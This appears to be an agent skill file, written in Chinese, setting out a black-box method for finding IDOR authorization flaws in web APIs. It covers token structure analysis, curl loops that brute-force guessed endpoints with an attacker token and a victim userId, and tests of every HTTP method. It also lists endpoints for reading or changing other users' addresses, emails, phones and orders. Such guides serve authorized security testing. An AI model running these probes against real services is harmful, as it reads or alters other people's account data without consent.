---
name: idor-detection
description: "IDOR hunt: GET-vs-POST gaps, token analysis, API brute."
version: 1.0.0
metadata:
  hermes:
    tags: [penetration, idor, authorization, api]
---

# IDOR 越权检测专项

面向黑盒 Web 渗透的 IDOR 漏洞系统化检测方法。

## 核心原则：GET ≠ POST

**读接口和写接口的鉴权力度经常不一致。** 实战反复验证：
- GET 做了 userId 归属校验 → 不等于系统安全
- POST/PUT/DELETE 可能完全跳过权限检查

**永远不要因为 GET 被拒就停止——必须逐个测试每个 HTTP 方法。**

## 检测流程

### Phase 1：获取身份
1. 注册/登录获取 Token-A（用户A）
2. 注册/登录获取 Token-B（用户B），或直接猜测目标 userId
3. 分析 Token 结构：前缀、userId位置、时间戳、签名算法

### Phase 2：Token 结构分析
拿到 token 先拆解，判断签名机制：
```
USER_1001879_1785464325294.AE/J95WJMLEilQ2ZCR6rMS7IDSSL4lVNFSmX452b+AQ=
^^^^ ^^^^^^^ ^^^^^^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
前缀  userId  时间戳        HMAC签名(base64)
```

测试矩阵：
| 操作 | 结果含义 |
|------|---------|
| 原token + 改 X-User-Id | `您没有权限` → 后端有权限校验；`成功` → 严重IDOR |
| 改token中userId | `无效令牌` → 签名校验userId（无法伪造） |
| 清cookie后token仍可用 | Token 永不过期（独立风险） |

### Phase 3：API 端点发现

**三板斧（按优先级）：**
1. **FindSomething 浏览器插件** — 自动提取 JS 中所有路由、API、密钥
2. **下载 JS chunk grep** — `/api/`、`baseURL`、`url:`、`path:`
3. **REST 惯例猜测** — 批量撞接口

**批量探测脚本模板：**
```bash
TOKEN="USER_1001879_xxxxx.xxxxx"
ATTACKER=1001879
VICTIM=1001878

for path in \
  api/profile/address api/profile/email api/profile/phone \
  api/profile/info api/profile/update api/profile/detail \
  api/user/info api/user/order api/user/policy \
  api/order/list api/policy/list api/address/list \
  api/users/${VICTIM} api/admin/user/${VICTIM}; do
  
  resp=$(curl -sk --max-time 3 "https://target.com/$path?userId=$VICTIM" \
    -H "X-User-Token: $TOKEN" -H "X-User-Id: $ATTACKER")
  
  if ! echo "$resp" | grep -q '"status":404'; then
    echo ">>> $path: $(echo $resp | head -c 200)"
  fi
done
```

### Phase 4：逐个方法测试

对每个发现的接口，测试所有 HTTP 方法：

```bash
for method in GET POST PUT DELETE PATCH; do
  curl -sk -X $method "https://target.com/api/profile/address?userId=$VICTIM" \
    -H "X-User-Token: $TOKEN" -H "X-User-Id: $ATTACKER" \
    -H "Content-Type: application/json" -d '{}'
done
```

**关键判断逻辑：**
- `"不支持的HTTP请求方法"` → 接口存在！换方法
- `"XX不能为空"` / `"数据格式错误"` → **越权成功！** 走到了业务校验层
- `"您没有权限"` → 鉴权有效
- `404` → 接口不存在

### Phase 5：常见 IDOR 漏洞模式

**写接口越权（高危）：**
```
POST /api/profile/address?userId=<victim>     ← 改他人地址
POST /api/profile/email?userId=<victim>       ← 改他人邮箱
POST /api/profile/phone?userId=<victim>       ← 改他人手机
POST /api/users/submit-authentication?userId=<victim>  ← 替他人认证
```

**读接口越权（中危）：**
```
GET /api/profile/info?userId=<victim>         ← 读他人信息
GET /api/order/list?userId=<victim>           ← 读他人订单
GET /api/policy/list?userId=<victim>          ← 读他人保单
```

## 输出规范

- 只出能拿权限/信息的漏洞
- 每条漏洞：URL + 请求包 + 响应证据
- 危险写操作先确认再执行
